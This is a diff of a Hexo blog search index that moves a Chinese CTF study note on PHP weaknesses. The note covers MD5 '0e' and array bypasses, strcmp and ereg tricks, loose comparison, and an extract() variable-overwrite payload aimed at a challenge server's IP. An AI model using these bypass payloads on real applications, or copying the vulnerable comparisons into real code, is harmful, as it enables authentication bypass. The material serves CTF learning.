@@ -1,6 +1,86 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF中常见的黑魔法</title>
+    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
+    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
+<a id="more"></a>
+<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
+<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
+<p>1.0e开头的全部相等（==判断）</p>
+<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
+<p>Md5和sha1一样</p>
+<p>2.利用数组绕过（===判断）</p>
+<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
+<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
+<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
+<p><strong>代码测试</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>get 传参 password[]  数组，成功打出flag</p>
+<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
+<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
+<p><strong>定义和用途</strong></p>
+<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
+<p>1.数组绕过</p>
+<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
+<p>2.%00截断绕过== 的比较</p>
+<p>测试环境： php5.3版本，php7不行</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
+<p>加入%00，可以发现后面的c被截断了</p>
+<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
+<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
+<ol>
+<li>
+<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
+</li>
+<li>
+<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
+</li>
+</ol>
+<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
+<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
+<ul>
+<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<ul>
+<li>布尔值true和任意字符串都弱相等。例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+<ul>
+<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
+<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
+<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
+</ul>
+<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
+<p>直接看题</p>
+<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
+<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
+<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
+<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
+<p>该函数返回成功设置的变量数目。</p>
+<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
+<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
+<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
+<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
+<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
+<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
+<p>2. if($a==$c) == 》 TRUE</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
+<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
+<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Buuctf刷题记录</title>
     <url>/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/</url>
     <content><![CDATA[<h1>Buuctf刷题记录</h1>
@@ -144,86 +224,6 @@ PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符
       <categories>
         <category>刷题站</category>
         <category>buuctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CTF中常见的黑魔法</title>
-    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
-    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
-<a id="more"></a>
-<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
-<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
-<p>1.0e开头的全部相等（==判断）</p>
-<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
-<p>Md5和sha1一样</p>
-<p>2.利用数组绕过（===判断）</p>
-<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
-<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
-<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
-<p><strong>代码测试</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>get 传参 password[]  数组，成功打出flag</p>
-<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
-<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
-<p><strong>定义和用途</strong></p>
-<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
-<p>1.数组绕过</p>
-<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
-<p>2.%00截断绕过== 的比较</p>
-<p>测试环境： php5.3版本，php7不行</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
-<p>加入%00，可以发现后面的c被截断了</p>
-<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
-<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
-<ol>
-<li>
-<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
-</li>
-<li>
-<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
-</li>
-</ol>
-<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
-<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
-<ul>
-<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
-<ul>
-<li>布尔值true和任意字符串都弱相等。例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
-<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
-<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
-</ul>
-<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
-<p>直接看题</p>
-<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
-<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
-<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
-<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
-<p>该函数返回成功设置的变量数目。</p>
-<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
-<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
-<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
-<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
-<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
-<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
-<p>2. if($a==$c) == 》 TRUE</p>
-<p>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
-<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
-<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>常见黑魔法</category>
       </categories>
   </entry>
   <entry>
@@ -719,18 +719,51 @@ payload: cat flag.php||</p>
   <entry>
     <title>ctfshow入门之文件上传</title>
     <url>/2021/01/15/ctfshow%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="bc1606afdc02df620d956d897eeb22c8b21aded21adfc0d7c502fcf86e2c004c">6031008eaf30dfa9f6cee48a6a69006e86a67e58b9d4e21be6c19d1f8c3620d5296a4edc4df2c262412519c9bb524f29fc96bbf3df0278ad979fd50191fd3e615dd429ca6fd3f099c181b4b58e0d1ee349473edb6ee58f4cc0e39f0eb858dc62bc47f65167e75a02b1464dac8d56fd6fae1c8ad94e477027a62a81129c364e7017cae82a56fd0a39ad5dfb396927adf108fb04ee77a6cf34c25332aa1adf58e7ddee8d1f01d96472ea4ae6fe5d5ddf4ec9a48789425be88bf02fcf6ce4e3dfb4340a3c2c0cdd3b0c520705f7a231f35a4859abbcfa3441a95a79725efb087ac9b7b649cdb2dce460e10a1c716ffbaa8b34440fee44d24469649f9a62a4baf98586c8c45277c39794f106f282e43ece4eed5540456533e6c8de25657b3c0c9f3de363a5eb64dd4f363eef0e9965baa81b4f729617fbc961cc55eb1abf86c2035feb525079d218640500bf0a6e8e08776190bc3f493a27511968eb665ffe744cf4b7c41581bc12f6ae49277a573b1f19f7f309843a54e7c3390d493183397d9ddd70f23894824e7a02e9cffe6e0e2ef6b9bb82849a3a173dde5cc99504678d2f686e93beb859f2ae79dd2b631f186a049b6ea61c328401dad52c88d2b946a1e75d8e75715c1be3200e2e49c383bf1ba24dd7696bb1c8ef82ad8009470de5c3fecb718ec313e962485ddaa5da95d2ecee1aa898fd87e942124d9e69d72e0de8c4b3fc117b351d110a2737343c0bdce06e619afda3f6a3d16ccb3b2b5a39861705e45112ca026625b8c747a772d4238657cb0e361da04462cc233724f39af3a73ecb1c33040b53195a653277e258033afa3014bbac81a88afb31bd652e0fec61a18033956fa940bbec1fe34468066ccc62d1870fa8332f31104619555623fedf2639497f3e3f9d0eca0888b5ab8f2bed881b1ce0ca8617274d98de761181b1487dc554c9e10e1b0658140f70b886ec042f821ab37c6ae06802fae45e5e29cdafa086f4a6e7b9a5292a00585fb9921c2c2177731ea9f7674bf7de427e39a73d646bce9d024badfa385f4972eebd2c45fce367fd9ee07d428f105144fcee759547e6213c1f8b0c8c1d5a351bbe4ed82dd24ae69f7b97323f72d692ced9e66df91b6148ff2e95412e61eca7a9b7ef5d95f56443d5e32b2c85b7d981c067d4abf903156c2603cca432ad58a07cfeb11b3a3e3d6902574497841561f894cff1e5076ad3f3c4d1b541d2d7d0731a6193d6e8fd3da612cb55f05cd2d52b84322f34eeae71b4ed3e8f119c5fd5798e24df8c94e1178f9b97aeff71bd4456c817101fbc27a5dcabb3e8de612b707b82c626993e565b2b63868441527db7b1c72d440c3154ae70cee51fe07929faa18f45917151db36ca8faacd58caa69b0abb38b3b80a01ab7447f65fa1f9a1c23afb6094a208a0751616db789963211111421306873c4ae30b256eb09dae03d60da3feb66c6c7d3f4088135f25a21d5d1e9db49cebee00905aa80d2b1c2877b137353f72278838d34ddb97593522ec0d714635dcdcefbc4cbc6ffcdda628b62bfa8986f77e6bf3d86ba9a145a8d39229b3229a54a9f6a729b2f549933e4ac9e6637d8efc8534591a204a30be9703cb757ce96b7e8d48ae794c2ce27ff3b5473923e74a64c9d7b15d35eeee44edb1fa15c6159aaecd4f5ed0b75171a49630b8529f71d9bd129871e4d304af31273a34dca9ffba98a8aa937105a4e50744e853d9b274633875129fab16049dce23bbf902adab2ef1d89f6c3b140548c7e77f085b454b054f0b0d6549d6561d76669023607c49eb4d21a446b61a3cf18875e7d141f151c3528259daa930694c0a84b3f555e4e43ab7ad0f5be87351a3f9ee3bfc68cd5008dd1f7f48faf7090fa8292e92e35cd82f42d28b41994d36a15921e5920f6f890b850af703b4eafc86a0d33a468b89f0340e5aa6a337b6fe2ed5aacfa8f4b373b083e9b6a6678074f6248154920e0679863e93db4435fb532a074ae8982a90562e125641faba629e00651c5fd7e3a9b0071f3f17f69337e2fa509a21c6dcceee4377781f38ba1b1ba2ad80efc6b59e9e684c4ee4fc774f6b0850afeb64c84ab1c1b6ad4a4192d880e1e1d48f7782e85b2a9b1ad0d1530de8d5289678b9e78b60cc5188fc29011892f2b4dcf171cf4baef8751f4a978d0d01b607ac33cdc6589021ea5d10f600fda032e7e2ec81ef43504a7d0dbad1c7bb117c8dc2141f69b27c3fed7bba5a2494fd7d95cb3a06f19699a450902ad581306ff68ebdaacbd139ec15dbecaaa4618b158a2677b823a47afb2bcedc52c1e5faf436b93bc4248b1d05d0f58615c24d4d0b326c0a0d2ac795111899c790a6e3d2df2767f8dee54d8855ffe8c836ca6a68a6110da293f928dad3eddfbac047630b8de9736293d3353fafe6c2bc829785aca47ff4ccb962a6da2986b0592474ec9aceebad1bdfde2cd21d6c8c2595a0f5e987922ef392778f69179e6985cb46580526243c005db7985faa5bce03f50e5f10f17ff21c8ed24716d1f4292591e23bc66dab39e5bf8f67502dfe3b46b15c18b5f03d6675a5473246a8c44bbefceb131b20227f0c2b83c83f4af9c3c7f0e663b26b082c3eaf06ff9b561d7ad4c6eabc2bc39023ef2e5bd804c4a5c5b4489d2f87d3b5d23b114e4ea8f158135806d8c00d849201202934a932406832ccf9e5aeb4b6ee2244f692897bdaff95190c56c11066e21b4cec184a0f62134c4de8b8d760633270b5f095d97abe810ec2d8e819db5ac7b7e14f45f9e6c891b4005b2ca7726e465dab783415ea31ab0f8d0ec4cff57bc5249de2fd30392882b7ca77ffd5b71561634bca26225b64f92abd4df3ff98eed332f3651bcca094e6e3472d4a9ca1a3487cc7466bdf7ccfa91c2352c5ee1449f43326627c8c63c0407d5c99b7a67c16aef0f06708d00eef78dcf0f13c1033d360f0313ff2b2f24a2d1ab9e17c73b877160ad3c758e56fd3102bc8c1888a4e177c049c61858548f3ba8f74758dcc791d5a7e5e6578e66f0ad9fb4babbdcf0e019a56ed59863debdd19037da603e6bab10bee00aa7f300f435a1f3eab3c1a9ff2f449db2d5a4177d1dadc2d2a14791541ad34552d741645fb5e6998c87a5627fb24e08278cc0eadaf0c60344b1241956477acee31f484f799768c39ce43245cf04ad13b69ef88868243887046120347bdae13775afc7da50cee6f3fce6c7ee10ef37768c3760dde2fb1a2c57269f53e4baf332cdec0180b8d7d8e4156b6ea01c85382de614cf179988af10c2e87549c17edb59e91b746dbe5ac22885ee59fd41c3454197d2a50495fa8b020e5a2bf31e530596aefae6c727142717439eaa97192f55f8728a64f54380ceff842d2cf3968605cfc46cdca0daa5e4fb34f20085ce3a8a97453a09edea1df56f32ce8b2d18b32e7efa7fe23f3e1d1193ecd7da9215639e4ea51bcea3bda24b3f278d1812b0003324acf8dab9fee0b2759d6f7af9c4d98346ea423f7c24a12facd551535de4f21897670416f641c7e0bb3dcf65a94c47c7ffea875f3cb13f23f0a7fd6555026465374fade099d4c7f8110b5b6f124455ceed5f595ada3b8aa6b92d08ed9e0a65c54b5b8e9d1e99ac331d7b4444f4c0d6a43971e8db9a78f6c394d40232fba26698001cb8189356f8476317bbdd876c51d331d64808c82056e8dbe0d8c62d3cee97db747b5e44d208830abf6016bbb9bbab54f534edc72873b6cc011b62cdaaa5dc62a85e7adb428bc8dce80013ae87700a8134c6f50a5314a9c43566eb88e2932cbf379f8d35d3cfd31522da50b6677e835c21180a6a752c87ac493047f2e87b6a6c7b3292d948f0d2e05cfe63f0e71ccf2c0bb627c80ef9a93e28dd58b9f4f30aff1a83db14256eb22ec75df2ecf12416f7ad477af833a6ea7cbbe64620f6bfbc3194b3c6dfd0eab9f5647caae527ba09b03c761b730cf09bdca3aeeb029cc1adf32f2a26bf1103f3733f39202407a990d7257e54a94a89a1dba544e991ec19543e6ce93d520342efa662fead1fb77b9df877b0702f7cb84940cdf09e407dafa31ed9bbb8361bdd90a2fa284b4654cd69723de9c12a534ac1be1aed661c7f74684da9cbb1f6e97fb5f52288be7904c207bb605663238fd0d85427dbc91eb8907d3af6faadb66b7acefeac4f635a3bc7b6206faf8d804f969aba64bc0d0ae9335cf5b1dc17e5c0d5d21c32e7a8d4b0d032a92331c81f42222fd55111f8d8bcb9d321d12628b1cf26b9b71ae6814027820abf68aa972febe0fac65564a64dab47c91fc213bde150725340c43170003a4493472af7fa2fb1f8464b0425e71266934bbcf638860d11ceac89df3f8c81f25a1a7b68993ffe7976c045a58c6a04a3328d284feaaab07d0ee4a270b77e55d569e6dfaee32d91b087b0593f830ee982fabeda043be82f710505c2d3d11f24503c48762526a13ad994e8c6e9659d7cb743a177308552dad343a0dd8fc8f871c43800de45a1feeae06632984d790d717f4717243eac5e33d504bbdbb864cef3814e215e12b47572118a6855580ea684d46f93c2ddd2cf9521c481e0e993b23c1a69a19d1bad4c948c53755f0c38120521858c83caa80db372af7e2a843729a82bbdbf5e18dc1415a00a6f51d2db7b5c12b7fca4944e28f612e337ba75f783beb0fe9c420074b6130d9fe811dd602b6b9d99d6c0e27f8f75c8f184946f3b2319f9b164115f8a172bba46fe89d762fc6291af2c22a0357c105aa581921692549bc43723cbea39daa76e0cd8b1fdecb6fe27a1985de8d9f7ebe7c0e548d9fa0b629ec311363e8a46cd5479068579b32d6dcc8565b08bcfc7e62ee1e4c4894ca8be8b5b471ef9c4b8d0f7c77c26a5614f29f24c220a44f7d9a132c709fc1d796f15ba03cc160d5acefb0585cc14b966e0f2494c74e4596148bf3488cccfc70fd533d84708d48d8ac111a77244d4c0ce629c37e0190ee446c5530204132adfd97f1e91fedae1e3259047b5cb97143f9509188d1f8391c44fde38e6d2251b2a5a694e2f4fbfbcaa9256f00c1d6eb5a7bbffc56d1ee4a2b0d685f029da3f70dcd937bdc60cb9cf63d5f45af35a0ba7455d89114d8fc7fd9ab1684b75fbf659861544e83b80ee1062bffa28790eb0299826324182a293abef38df3fa37585998ec1abc00276f0b27dabc71eee4b7384fd0257d7be77f23204d58e7e0ec1607a9a00ff432ab5c2e58b2a602c101f70448cbdbdb781983df4268574490267c6519a1ef0b9fa6198b8d5f2973c7f2